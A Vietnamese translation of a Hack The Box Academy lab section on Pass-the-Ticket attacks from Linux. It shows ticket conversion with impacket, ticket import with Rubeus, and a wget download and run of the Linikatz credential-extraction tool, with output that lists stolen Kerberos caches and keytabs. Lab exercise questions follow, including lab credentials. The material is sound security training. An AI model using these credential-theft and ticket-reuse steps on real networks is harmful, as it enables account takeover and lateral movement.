Nếu chúng ta muốn dùng một `ccache file` trên Windows hoặc một `kirbi file` trên máy Linux, chúng ta có thể dùng `impacket-ticketConverter` để chuyển đổi chúng. Để dùng công cụ này, ta chỉ định file cần chuyển đổi và tên file output. Hãy chuyển ccache file của Julio thành kirbi.

### Impacket Ticket Converter

```shellsession
naruto3co@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

Chúng ta có thể thực hiện thao tác ngược lại bằng cách chọn một `.kirbi file`. Hãy dùng file `.kirbi` này trên Windows.

### Import ticket đã chuyển đổi vào session Windows bằng Rubeus

```cmd
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

  ______        _
 (_____ \      | |
  _____) )_   _| |__  _____ _   _  ___
 |  __  /| | | |  _ \| ___ | | | |/___)
 | |  \ \| |_| | |_) ) ____| |_| |___ |
 |_|   \_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: Import Ticket

[+] Ticket successfully imported!

C:\htb> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\htb>dir \\dc01\julio

 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free
```

## Linikatz

**Linikatz** là một công cụ do team security của Cisco tạo ra để khai thác credential trên các máy Linux khi có sự tích hợp với Active Directory. Nói cách khác, Linikatz mang lại một nguyên lý tương tự Mimikatz áp dụng cho môi trường UNIX.

Cũng như **Mimikatz**, để tận dụng Linikatz, chúng ta cần có quyền root trên máy. Công cụ này sẽ trích xuất tất cả credential, bao gồm Kerberos ticket, từ nhiều cách triển khai Kerberos khác nhau như FreeIPA, SSSD, Samba, Vintella, v.v. Sau khi trích xuất được các credential, nó sẽ đặt chúng vào một thư mục có tên bắt đầu bằng `linikatz.`. Trong thư mục này, bạn sẽ thấy các credential ở nhiều định dạng khác nhau, bao gồm ccache và keytab. Chúng có thể được sử dụng, tương ứng, như đã giải thích ở trên.

### Tải và chạy Linikatz

```shellsession
naruto3co@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
naruto3co@htb[/htb]$ /opt/linikatz.sh

 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

              =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root  959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root  959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
-rw------- 1 root root    4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root  6406312 Oct 10 19:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root  8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root      113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root       40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root       15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root       12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root      504 Oct  6 11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
-rw-r--r-- 1 root root    8 Jul 18 12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list

Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting            Expires                Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/11/2022 19:48:03, Flags: RIA
        Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:

I: [kerberos-check] User Kerberos tickets

Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting            Expires                Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:32:01, Flags: FPRIA
        Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:

Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting            Expires                Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/11/2022 19:55:02, Flags: FPRIA
        Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:

Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting            Expires                Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/11/2022 19:55:02, Flags: FPRIA
        Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:

I: [check] KCM Kerberos tickets
```

---

## Câu hỏi thực hành (Connect to HTB)

> Kích hoạt target và trả lời các câu hỏi bên dưới (trả lời bằng tiếng Anh trên nền tảng thật để đảm bảo được chấm chính xác).

**Câu 1 (+40 XP):** Kết nối tới máy target bằng SSH tới cổng TCP/2222 với credential được cung cấp. Đọc flag trong thư mục home của David.
> SSH tới với user `david@inlanefreight.htb` và mật khẩu `Password2`

**Câu 2 (+40 XP):** Nhóm nào có thể kết nối tới LINUX01?

**Câu 3 (+40 XP):** *(Hint: Tìm một keytab file mà bạn có quyền đọc và ghi. Nộp tên file đó làm câu trả lời.)*

**Câu 4 (+40 XP):** *(Hint: Trích xuất hash từ keytab file bạn đã tìm được, crack mật khẩu, đăng nhập với tư cách người dùng đó và nộp flag trong thư mục home của user đó.)*

**Câu 5 (+40 XP):** *(Hint: Kiểm tra crontab của Carlos, và tìm các keytab mà Carlos có quyền truy cập. Thử lấy credential của người dùng svc_workstations và dùng nó để xác thực qua SSH. Nộp file flag.txt trong thư mục home của svc_workstations.)*

**Câu 6 (+40 XP):** *(Hint: Kiểm tra quyền sudo của user svc_workstations và chiếm quyền root. Nộp flag trong thư mục /root/flag.txt.)*

**Câu 7 (+40 XP):** *(Hint: Kiểm tra thư mục /tmp và tìm Kerberos ticket (ccache file) của Julio. Import ticket này và đọc nội dung file julio.txt từ thư mục chia sẻ domain \\DC01\julio.)*

**Câu 8 (+1, +40 XP):** *(Hint: Dùng Kerberos ticket của LINUX01$ để đọc flag trong \\DC01\linux01. Nộp nội dung đó làm câu trả lời — flag bắt đầu bằng `Us1nG_`.)*

**Bài tập tùy chọn 1 (+40 XP):** Chuyển ccache file của Julio từ LINUX01 sang máy tấn công của bạn. Làm theo ví dụ để dùng chisel và proxychains kết nối qua evil-winrm từ máy tấn công tới MS01 và DC01. Đánh dấu DONE khi hoàn thành.

**Bài tập tùy chọn 2 (+40 XP):** Từ Windows (MS01), export ticket của Julio bằng Mimikatz hoặc Rubeus. Chuyển đổi ticket sang ccache và dùng nó từ Linux để kết nối vào ổ C. Đánh dấu DONE khi hoàn thành.

---

*(Nguồn: Hack The Box Academy — Module "Pass the Ticket (PtT) from Linux", Section 22/26)*
